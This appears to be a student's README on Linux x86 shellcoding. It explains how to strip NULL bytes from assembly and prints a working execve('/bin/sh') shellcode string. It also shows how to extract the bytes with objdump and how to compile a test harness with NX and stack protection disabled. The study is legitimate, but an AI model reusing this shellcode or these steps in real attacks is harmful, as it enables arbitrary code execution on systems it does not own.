# Linux shellcoding

## shellcode


- `exit1.asm` assembly program containing NULL bytes.
- `exit2.asm` assembly program containing no NULL bytes.

- `objdump` of `exit2`

```sh
$ objdump -Mintel -D exit2

exit2:     file format elf32-i386


Disassembly of section text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       b0 01                   mov    al,0x1
 8049004:       cd 80                   int    0x80
```

- __Using smaller portions of registers (`AL`) do not produce null bytes.__
- Use these bytes `"\x31\xc0\xb0\x01\xcd\x80"` to populate `code` array in `source.c`.
- Compile `source.c` with:

```sh
$ gcc -z execstack -m32 -o bin/source source.c
```

- `-z execstack` turns off the NX protection to make the stack executable
- However running `bin/source` results in:


```sh
$ ./bin/source
Segmentation fault (core dumped)
```


### Getting dirty with an actual shell

- Have a look at `shell_example.asm` which is an assembly program which spawns a shell using `execve` syscall.
- `system('/bin/sh')` would be easier, but it drops privileges.
- Problem with `shell_example.asm` as the shell code is that it contains ONE NULL byte (used for terminating the string):

```sh
$ objdump -M intel -d bin/shell

bin/shell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       31 db                   xor    ebx,ebx
 8049004:       31 c9                   xor    ecx,ecx
 8049006:       31 d2                   xor    edx,edx
 8049008:       b0 0b                   mov    al,0xb
 804900a:       bb 00 a0 04 08          mov    ebx,0x804a000
 804900f:       cd 80                   int    0x80
 8049011:       b0 01                   mov    al,0x1
 8049013:       31 db                   xor    ebx,ebx
 8049015:       cd 80                   int    0x80
```

- Notice what I had to do in `shell2.asm` to get rid of that NULL byte.
- I had to manually push hex characters onto the stack.

```sh
$ objdump -M intel -d bin/shell2

bin/shell2:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       31 db                   xor    ebx,ebx
 8049004:       31 c9                   xor    ecx,ecx
 8049006:       31 d2                   xor    edx,edx
 8049008:       50                      push   eax
 8049009:       68 6e 2f 73 68          push   0x68732f6e
 804900e:       68 2f 2f 62 69          push   0x69622f2f
 8049013:       89 e3                   mov    ebx,esp
 8049015:       b0 0b                   mov    al,0xb
 8049017:       cd 80                   int    0x80
 ```

 - Get those hex bytes with:

 ```sh
 $ objdump -d ./bin/shell2 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
```


- And put the in the `source.c`, compile and run:

```
$ gcc -z execstack -m32 -g -o bin/vulnerable source.c
$ ./bin/vulnerable
Segmentation fault (core dumped)
```

- I've managed to solve the segmentation fault, by moving `code` array into the function, making it a local variable.
- The reason is that __global variables aren't put on the stack__ and therefore can't be executed.
- Compiling it with the usual options spawns a shell now without problems.

```sh
$ gcc -m32 -fno-stack-protector -z execstack source.c -o bin/vulnerable
$ ./bin/vulnerable
$ echo $?
0
```

## TO-DO

1. ~~Solve segfault~~

---

#### Resources:

1. https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html
2. https://forum.hackthebox.com/t/shellcode-not-running-as-expected-showing-segmentation-fault-core-dump/253161
